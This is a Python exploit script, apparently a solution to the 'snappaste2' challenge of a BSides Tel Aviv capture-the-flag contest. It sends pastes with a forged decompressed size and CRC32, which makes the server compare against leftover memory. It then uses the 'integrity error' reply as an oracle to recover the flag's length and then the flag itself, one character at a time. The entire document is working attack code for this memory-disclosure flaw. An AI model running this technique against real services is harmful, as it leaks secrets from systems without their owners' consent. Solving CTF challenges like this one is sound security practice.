import requests
import struct
import time
import zlib
import string

session = requests.Session()

def paste(metadata_size, data_compressed_size, data_decompressed_size, data_crc32, metadata, data_compressed):
    data = struct.pack('<IIII', metadata_size, data_compressed_size, data_decompressed_size, data_crc32)
    data += metadata
    data += data_compressed
    return session.post(url='https://snappaste2.ctf.bsidestlv.com/paste', data=data).text

def view(name):
    result = session.get(url='https://snappaste2.ctf.bsidestlv.com/view/' + name).text
    return result

def check_buffer_suffix(offset, suffix):
    metadata = b'AAAA'
    metadata_size = len(metadata)
    data = b'B'*offset
    data_compressed = zlib.compress(data)
    data_compressed_size = len(data_compressed)
    data_decompressed_size = len(data)
    #data_crc32 = zlib.crc32(data)

    data_decompressed_size += len(suffix)  # fool the server
    data_crc32 = zlib.crc32(data + suffix)

    response = paste(metadata_size, data_compressed_size, data_decompressed_size, data_crc32, metadata, data_compressed)
    return response != 'integrity error :('

start_time = time.time()
print(f"Start time: {start_time}")
print('Finding flag length...', end='')
for i in reversed(range(101)):
    print(f' {i}', end='')
    if not check_buffer_suffix(i, b'\0'):
        flag_length = i + 1
        break

print()
print(f'flag_length = {flag_length}')

print('Finding flag... ', end='')
flag = ''
for i in range(flag_length):
    for char in string.printable:
        if check_buffer_suffix(flag_length - i - 1, (char + flag).encode()):
            print(char, end='')
            flag = char + flag
            break

print()
print(f'flag = {flag}')
end_time = time.time()
print(f"End time: {end_time}")
print(f"Elasped: {end_time-start_time}")